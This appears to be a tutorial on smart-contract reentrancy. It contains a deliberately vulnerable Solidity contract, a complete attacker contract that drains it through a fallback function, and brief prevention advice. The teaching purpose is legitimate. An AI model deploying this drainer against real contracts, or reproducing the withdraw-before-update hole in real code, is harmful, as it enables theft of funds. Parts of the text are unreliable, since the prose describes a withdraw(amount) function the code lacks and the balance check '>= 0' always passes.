# Re-Entrancy

## Introduction

<hr>

Reentrancy is a vulnerability in smart contracts that occurs when a contract calls an external contract and the external contract calls back into the original contract before the original contract has completed its execution. This can create a loop where the same function is executed repeatedly, potentially leading to unintended consequences such as transferring more funds than intended, locking up the contract, or other unexpected behavior.

## Understanding Reentrancy

<hr>

To understand how reentrancy works, let's consider a simple example. 

Suppose we have two contracts: Contract A and Contract B.

Contract A : Contract A is a smart contract that holds user funds and allows users to withdraw them. It contain functions for checking balances, transferring funds, and verifying that the sender of a transaction has sufficient funds. The general structure of the contract's withdraw function is shown in the image below:

<center><img class="image w30" src="./assets/images/re-entrance-1.jpg"></center>
<b><center class="img-label">Contract A</center></b>

According to the image, `Contract A` has `50 Ether` in funds. The `withdraw()` function first checks whether the user's balance is greater than `zero`. If it is, the contract sends the associated funds to the user and sets the user's balance to zero. For example, let's say `Bob` has a balance of `20 Ether` stored in this contract and wants to withdraw his funds. He can use the contract's `withdraw` function to request the funds. The function will check if `Bob` has a balance stored in the contract (he does, with 20 Ether). The contract will then send the balance back to `Bob`, reducing the contract's balance to `30 Ether` (`50 Ether` minus `20 Ether`). Finally, the contract sets Bob's balance to `zero`. This is how the withdraw function works.

Now Let's examine how Contract B, an attacker contract, can exploit the Contract A's withdraw function:

Contract B has two functions: a `fallback function` and a function called `attack`. Both functions call the `withdraw` function within Contract A. At the beginning of the attack, Contract A has zero Ether in funds. The general structure of the contract's attack and fallback function is shown in the image below:

<center><img class="image w30" src="./assets/images/re-entrancy-1a.jpg"></center>
<b><center class="img-label">Contract B</center></b>

The execution of these functions works as follows:

**1.**  Assuming Alice deposited 10 ether to Contract A through Contract B, Contract A is aware that Contract B has 10 ether. Subsequently, Alice calls the `attack()` function, which calls the `withdraw()` function in `Contract A`. Contract A verifies that Contract B address has a balance greater than zero as a condition to proceed with the function call.

<center><img class="image w90" src="./assets/images/re-entrance-2.jpg"></center>
<b><center class="img-label">Calling attack() function</center></b>

Contract A confirms that Contract B has a balance greater than zero (which is 10 Ether), and proceeds with the function call. Contract A then sends the 10 Ether back to Contract B, which triggers the fallback function of contract B.

<center><img class="image w90" src="./assets/images/re-entrance-3.jpg"></center>
<b><center class="img-label">Transfer of funds from Contract A to Contract B</center></b>

At this point, the current state of the contracts is that Contract B has a balance of 10 Ether, while the balance of Contract A is reduced to 40 Ether. However, it is important to note that the execution of Contract B's fallback function is still pending, and the execution of Contract A's withdraw() function is also pending (Due to this the balance of Contract B in the contract A state remains at 10 Ether).

The fallback function of Contract B invokes the withdraw() function in Contract A once more. Upon invocation, Contract A verifies that Contract B's balance is still greater than zero, which is true (It currently holds 10 Ether), and proceeds to transfer an additional 10  to Contract B.

<center><img class="image w90" src="./assets/images/re-entrance-4.jpg"></center>
<b><center class="img-label">Transfer of funds from Contract A to Contract B</center></b>

At this point, the current state of the contracts is that Contract B has a balance of 20 Ether, while the balance of Contract A is reduced to 30 Ether. Tt is important to note that the execution of Contract B's fallback function is again still pending, and the execution of Contract A's withdraw() function is also pending.

This cycle can repeat, with the fallback function in Contract B repeatedly calling the withdraw() function in Contract A. Each time this happens, Contract A sends additional funds to Contract B, causing the balance of Contract A to decrease and Contract B's balance to increase. This is how Contract B can continuously exploit the withdraw() function of Contract A.

<center><img class="image w90" src="./assets/images/re-entrance-5.jpg"></center>
<b><center class="img-label">Transfer of funds from Contract A to Contract B</center></b>

In this attack, Contract B repeatedly calls the withdraw function of Contract A in a loop without waiting for the previous transaction to complete. As a result, the balance of the user in Contract A is not updated before the next withdrawal, allowing the attacker to repeatedly withdraw funds from Contract A.

In conclusion, a reentrancy attack is a type of vulnerability that can occur in smart contracts when a contract is allowed to call back into itself or another contract before the first invocation has completed. This can be exploited by attackers to repeatedly execute a vulnerable function and drain funds from the contract.

## POC

<hr>

```sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

contract VulnerableContract {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balances[msg.sender] >= 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }
}
```

This is a simple smart contract called VulnerableContract that allows users to deposit and withdraw ether. The contract has three functions:

**1. deposit():** This function allows anyone to deposit ether into the contract. The amount of ether deposited by the sender is added to their balance in the balances mapping.

**2. withdraw(uint amount):** This function allows a user to withdraw a specified amount of ether from their balance in the balances mapping. It first checks if the user has a sufficient balance to withdraw the specified amount by using the require statement. If the user has sufficient balance, the function attempts to transfer the specified amount of ether to the user's address using the call function. If the transfer is successful, the specified amount is subtracted from the user's balance in the balances mapping.

**3. getBalance():** This function allows a user to check their balance in the balances mapping. It returns the balance of the caller (the address that calls the function).

Note that this contract is vulnerable to a reentrancy attack. If an attacker were to call the withdraw() function from a malicious contract that implements a fallback or receive function that calls back into the vulnerable contract, the attacker could repeatedly call the withdraw() function and drain the contract's balance. 

Now we will create a POC of the VulnerableContract that exploits its vulnerability to a reentrancy attack. We will then use the POC to demonstrate how the vulnerability can be exploited to drain the contract's balance.

To create the AttackerContract, we first need to create an instance of the VulnerableContract. We do this by passing the address of the deployed VulnerableContract to the constructor of the AttackerContract.

```sol
contract AttackerContract {
    VulnerableContract vulnerableContract;

    constructor(VulnerableContract _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }
}
```
Next, we need to create a fallback function that is called whenever someone sends ether to the AttackerContract. In this fallback function, we check if the balance of the VulnerableContract is greater than or equal to 1 ether. If it is, we call the withdraw function of the VulnerableContract.

```sol
    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw();
        }
    }
```

The fallback function in the AttackerContract is payable, which means that it can receive ether when it is called. This is important because the AttackerContract needs to be able to receive ether in order to deposit it into the VulnerableContract and then withdraw it repeatedly. The reason we create a fallback function in the AttackerContract is that it is called automatically when ether or calldata is sent to the contract, allowing us to exploit the vulnerability without explicitly calling the withdraw function.

Finally, we need to create an attack function that deposits 1 ether to the VulnerableContract and then calls the withdraw function of the VulnerableContract. 

Since the balance of a newly created account in VulnerableContract is 0, if we were to call the withdraw function without first depositing any funds, the require statement would prevent us from withdrawing any ether. Therefore, we need to deposit some ether into the contract to satisfy the require statement and pass the check. In this particular case, we are depositing 1 ether, but the amount could be any positive number greater than 0 to satisfy the check. 

```sol
    function attack() public payable {
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }
```

The attack function can be called by anyone, and it will drain the balance of the VulnerableContract if it has at least 1 ether.
We can also create a getBalance function to check the balance of the AttackerContract.

The attack() function is marked as payable because it receives ether as a parameter when it is called. 

In this case, the attack() function sends 1 ether to the VulnerableContract using the deposit() function, which is a payable function. Therefore, the attack() function must be marked as payable to receive the 1 ether that is being sent to it.

By marking the function as payable, we are allowing it to receive ether and we can then use that ether to call the deposit() function of the VulnerableContract and deposit 1 ether into the contract before calling the withdraw() function.

So, marking the attack() function as payable is necessary in this case because it receives ether that is used to interact with the VulnerableContract and perform the intended attack.

```sol
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

In conclusion, the AttackerContract POC demonstrates how a simple vulnerability in a smart contract can be exploited to drain the contract's balance. It is important for developers to thoroughly test and audit their smart contracts to ensure that they are secure and free from vulnerabilities.

Final AttackerContract

```sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

contract AttackerContract {
    VulnerableContract vulnerableContract;

    constructor(VulnerableContract _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }
    
    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw();
        }
    }
     
    function attack() public payable {
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

## Exploit

First Deploy Vulnrable Contract
Add Some money with different accounts

Deploy Attacker Contract 
And exploit

Send VS Transfer VS Call:

## Preventative Techniques

To avoid re-entrancy, you can use the Checks-Effects-Interactions pattern as outlined further below:

Re-entrancy is not limited to Ether transfers, but can occur with any function call on another contract. This means that when a contract calls a function on another contract, that contract can potentially call back into the original contract before the original function call has completed. This can create a loop that allows an attacker to repeatedly execute the same code and potentially modify the state of the contract in unintended ways.

In addition to considering re-entrancy risks in single-contract situations, it's also important to take multi-contract situations into account. As you mentioned, a called contract could modify the state of another contract that the original contract depends on. This can create additional security risks and vulnerabilities that need to be carefully considered and addressed.

To mitigate the risk of re-entrancy attacks, developers can use various techniques such as using the "checks-effects-interactions" pattern, which involves checking for conditions and performing all necessary state changes before interacting with other contracts. Additionally, developers can use mutex locks or other mechanisms to prevent multiple re-entrant calls from occurring simultaneously. Overall, it's important to carefully consider the potential risks and use best practices to ensure that smart contracts are secure and resistant to attacks.

https://stackoverflow.com/questions/67722470/reentrancy-hack-in-solidity-no-longer-working-on-pragma-0-8-0

list of bugs , POCs

https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/

# Types of Re-Entrancy Attacks

- Single-Function Reentrancy
- Cross-Function Reentrancy
- Cross-Contract Reentrancy
- Cross-Chain Reentrancy
- Read-Only Reentrancy
